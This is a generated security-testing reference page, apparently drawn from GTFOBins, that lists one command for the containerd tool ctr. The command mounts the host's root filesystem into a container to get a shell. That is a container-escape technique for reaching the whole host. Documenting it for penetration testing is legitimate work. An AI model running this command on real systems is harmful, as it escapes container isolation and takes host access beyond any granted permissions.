---
parsed_by: focuslocust
source: commands
type: generated
---
# ctr Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ctr

Tool page: [ctr](../../tools/linux/ctr.md)

### shell

```text
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ctr` |
| Evidence | Function example preserved from source parser. |
